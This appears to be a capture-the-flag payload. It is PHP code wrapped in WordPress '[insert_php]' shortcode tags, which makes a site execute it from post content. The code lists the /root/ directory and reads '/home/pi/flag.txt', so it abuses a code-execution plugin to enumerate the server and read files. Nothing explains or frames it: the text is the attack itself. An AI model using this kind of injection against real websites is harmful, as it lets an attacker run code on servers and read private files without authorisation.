[insert_php]

$dir    = '/root/';
$files1 = scandir($dir);

print_r($files1);

echo 'WOOT';
$file = file_get_contents('/home/pi/flag.txt', true);
echo $file;


[/insert_php]


